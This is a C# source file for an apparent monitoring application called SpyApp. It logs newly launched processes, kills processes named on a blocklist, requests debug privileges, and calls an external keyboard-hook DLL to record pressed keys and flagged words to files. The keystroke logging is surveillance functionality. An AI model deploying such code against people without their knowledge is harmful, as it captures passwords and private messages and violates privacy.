﻿using SpyAppClasses;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SpyApp
{
    class SpyApp
    {
        [DllImport("SETKBHOOK.dll", CharSet = CharSet.Unicode, CallingConvention = CallingConvention.Cdecl)]
        public static extern void StartMonitKeys(
        [MarshalAs(UnmanagedType.LPStr)] string statsPath,
        [MarshalAs(UnmanagedType.LPStr)] string modPath,
        [MarshalAs(UnmanagedType.LPStr)] string badWordsPath);

        private SpyInfo _spyInfo;
        private List<string> _badApps;
        public SpyApp(SpyInfo spyInfo)
        {
            _spyInfo = spyInfo;
            _badApps = new List<string>();
        }
        /// <summary>
        /// Запускаем Spy с учетом SpyInfo
        /// </summary>
        public void On()
        {
            if (_spyInfo.StatsOn || _spyInfo.ModerOn)
            {
                Thread statsThread = new Thread(new ThreadStart(ProcessesThreadFunct));
                statsThread.Start();

                Thread keysThread = new Thread(new ThreadStart(PressedKeysStats));
                keysThread.Start();
            }                  
        }
        ///processes
        private void ProcessesThreadFunct()
        {
            if (_spyInfo.BadAppsPath != string.Empty)
                ReadBadAppsFromFile();

            TryGetAdminMode();

            ScanProcesses();
        }
        private void ReadBadAppsFromFile()
        {
            try
            {
                using (StreamReader sr = new StreamReader(_spyInfo.BadAppsPath))
                {
                    while (!sr.EndOfStream)
                        _badApps.Add(sr.ReadLine());
                }
            }
            catch(Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }
        private void TryGetAdminMode()
        {
            try
            {
                //запускаем поток с правами администратора
                Process.EnterDebugMode();
                Console.WriteLine("Admin mode!");
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message + ". " +
                    "Приложение запущено без прав администратора " +
                    "(системные процессы отслежены не будут!)");
            }
        }
        private void ScanProcesses()
        {
            Console.WriteLine("Scan processes...");
            var currProcsList =
                Process.GetProcesses()
                .ToList();

            while (true)
            {
                var updProcsList =
                    Process.GetProcesses()
                    .ToList();

                var addedPrcs =
                    ComputeAddedProcs(currProcsList, updProcsList);

                if (addedPrcs.Count > 0)
                    LogAddedProcs(addedPrcs);

                currProcsList = updProcsList;
            }
        }
        private List<Process> ComputeAddedProcs(List<Process> oldPrcs, List<Process> newPrcs)
        {
            List<Process> addedProcs = new List<Process>();

            foreach (var np in newPrcs)
            {
                if (oldPrcs.Any(op => op.Id == np.Id) == false)
                    addedProcs.Add(np);
            }

            return addedProcs;
        }
        private void LogAddedProcs(List<Process> prcs)
        {
            string info = string.Empty;

            foreach (var p in prcs)
            {
                info += GetProcInfo(p);
            }

            WriteToFile(_spyInfo.LaunchedProcesses, info);
        }
        private string GetProcInfo(Process prc)
        {
            string info = string.Empty;

            try
            {
                info = $"{prc.StartTime} | id = {prc.Id} | {prc.ProcessName} ";
                if (IsProcessBad(prc))
                {
                    info += "BAD PROCESS!\n";

                    if (_spyInfo.CloseBadApp)
                        prc.Kill();
                }
                else
                    info += "\n";
            }
            catch(Exception e)
            {
                info = e.Message + prc.ProcessName + "\n";
                Console.WriteLine(e.Message);
            }

            return info;
        }
        private bool IsProcessBad(Process prc)
        {
            if (_badApps.Count == 0)
                return false;

            if (_badApps.Any(ba => ba == prc.ProcessName))
                return true;

            return false;
        }
        private void WriteToFile(string path, string info)
        {
            using (StreamWriter sw = new StreamWriter(path, true))
            {
                sw.Write(info);
            }
        }
        

        ///keys
        private void PressedKeysStats()
        {
            StartMonitKeys(
                _spyInfo.PressedKeys, 
                _spyInfo.TypedBadWords, 
                _spyInfo.BadWordsPath);
        }
    }
}
